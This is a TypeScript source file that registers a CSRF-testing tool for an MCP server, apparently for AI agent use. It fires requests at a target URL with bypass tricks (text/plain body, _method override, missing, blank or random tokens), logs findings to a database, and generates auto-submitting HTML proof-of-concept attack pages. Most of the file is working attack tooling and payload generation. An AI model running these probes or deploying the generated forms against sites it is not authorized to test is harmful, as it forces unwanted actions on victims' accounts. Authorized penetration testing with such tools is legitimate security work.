import { Server } from '../mcp/server';
import { formatToolResult, ToolResult } from '../types';
import { saveTestResult, saveFinding } from '../integrations/postgres';
import axios from 'axios';

export function registerCSRFTools(server: Server) {
  // Test for CSRF vulnerability
  server.tool(
    'security.test_csrf',
    {
      description: 'Test for CSRF vulnerabilities using advanced techniques',
      inputSchema: {
        type: 'object',
        properties: {
          url: { type: 'string', description: 'Target URL' },
          method: { type: 'string', enum: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'], default: 'POST' },
          params: { type: 'object', description: 'Parameters to test' },
          testTechniques: {
            type: 'array',
            items: { type: 'string' },
            description: 'Techniques to test (basic, content-type, method, token-bypass, referrer)',
            default: ['basic', 'content-type', 'method', 'token-bypass'],
          },
        },
        required: ['url'],
      },
    },
    async ({ url, method = 'POST', params = {}, testTechniques = ['basic'] }: any): Promise<ToolResult> => {
      try {
        const results: any[] = [];
        let vulnerable = false;
        let bestTechnique = '';

        // Test 1: Basic CSRF
        if (testTechniques.includes('basic')) {
          try {
            const response = await axios({
              method,
              url,
              data: params,
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
              },
              validateStatus: () => true,
            });

            const isVulnerable = response.status < 400 && !response.data?.error;
            if (isVulnerable) {
              vulnerable = true;
              bestTechnique = 'basic';
            }

            results.push({
              technique: 'basic',
              vulnerable: isVulnerable,
              status: response.status,
            });
          } catch (error: any) {
            results.push({
              technique: 'basic',
              vulnerable: false,
              error: error.message,
            });
          }
        }

        // Test 2: Content-Type bypass (text/plain)
        if (testTechniques.includes('content-type')) {
          try {
            const response = await axios({
              method,
              url,
              data: JSON.stringify(params),
              headers: {
                'Content-Type': 'text/plain',
              },
              validateStatus: () => true,
            });

            const isVulnerable = response.status < 400 && !response.data?.error;
            if (isVulnerable && !vulnerable) {
              vulnerable = true;
              bestTechnique = 'content-type';
            }

            results.push({
              technique: 'content-type',
              vulnerable: isVulnerable,
              status: response.status,
            });
          } catch (error: any) {
            results.push({
              technique: 'content-type',
              vulnerable: false,
              error: error.message,
            });
          }
        }

        // Test 3: Method override
        if (testTechniques.includes('method')) {
          try {
            const response = await axios({
              method: 'POST',
              url,
              data: { ...params, _method: method },
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
              },
              validateStatus: () => true,
            });

            const isVulnerable = response.status < 400 && !response.data?.error;
            if (isVulnerable && !vulnerable) {
              vulnerable = true;
              bestTechnique = 'method-override';
            }

            results.push({
              technique: 'method-override',
              vulnerable: isVulnerable,
              status: response.status,
            });
          } catch (error: any) {
            results.push({
              technique: 'method-override',
              vulnerable: false,
              error: error.message,
            });
          }
        }

        // Test 4: Token bypass (remove, blank, random)
        if (testTechniques.includes('token-bypass')) {
          const tokenTests = [
            { name: 'no-token', params: { ...params } },
            { name: 'blank-token', params: { ...params, csrf_token: '', anti_csrf: '' } },
            { name: 'random-token', params: { ...params, csrf_token: 'random123', anti_csrf: 'random123' } },
          ];

          for (const test of tokenTests) {
            try {
              const response = await axios({
                method,
                url,
                data: test.params,
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                },
                validateStatus: () => true,
              });

              const isVulnerable = response.status < 400 && !response.data?.error;
              if (isVulnerable && !vulnerable) {
                vulnerable = true;
                bestTechnique = `token-bypass-${test.name}`;
              }

              results.push({
                technique: `token-bypass-${test.name}`,
                vulnerable: isVulnerable,
                status: response.status,
              });
            } catch (error: any) {
              results.push({
                technique: `token-bypass-${test.name}`,
                vulnerable: false,
                error: error.message,
              });
            }
          }
        }

        const score = vulnerable ? 8 : 3;
        await saveTestResult(
          url,
          'csrf_test',
          vulnerable,
          { results, bestTechnique },
          undefined,
          score,
          JSON.stringify(params),
          JSON.stringify(results)
        );

        if (vulnerable) {
          await saveFinding({
            target: url,
            type: 'CSRF',
            severity: 'high',
            description: `CSRF vulnerability found using ${bestTechnique} technique`,
            payload: JSON.stringify(params),
            response: JSON.stringify(results),
            timestamp: new Date(),
            score: 8,
          });
        }

        return formatToolResult(true, {
          vulnerable,
          bestTechnique,
          results,
          poc: vulnerable
            ? generateCSRFPoC(url, method, params, bestTechnique)
            : null,
        });
      } catch (error: any) {
        await saveTestResult(url, 'csrf_test', false, null, error.message, 0);
        return formatToolResult(false, null, error.message);
      }
    }
  );
}

function generateCSRFPoC(
  url: string,
  method: string,
  params: any,
  technique: string
): string {
  const formInputs = Object.entries(params)
    .map(([key, value]) => `<input type="hidden" name="${key}" value="${value}"/>`)
    .join('\n      ');

  if (technique.includes('content-type')) {
    return `<!DOCTYPE html>
<html>
  <body>
    <form action="${url}" method="POST" enctype="text/plain">
      <input type="hidden" name='${JSON.stringify(params).slice(0, -1)}' value='}'/>
      <input type="submit" value="Submit request"/>
    </form>
    <script>history.pushState('','','/');document.forms[0].submit();</script>
  </body>
</html>`;
  }

  if (technique.includes('referrer')) {
    return `<!DOCTYPE html>
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="${url}" method="${method}">
      ${formInputs}
      <input type="submit" value="Submit request"/>
    </form>
    <script>history.pushState('','','/');document.forms[0].submit();</script>
  </body>
</html>`;
  }

  return `<!DOCTYPE html>
<html>
  <body>
    <h1>CSRF Proof of Concept</h1>
    <form action="${url}" method="${method}">
      ${formInputs}
      <input type="submit" value="Submit Request">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>`;
}









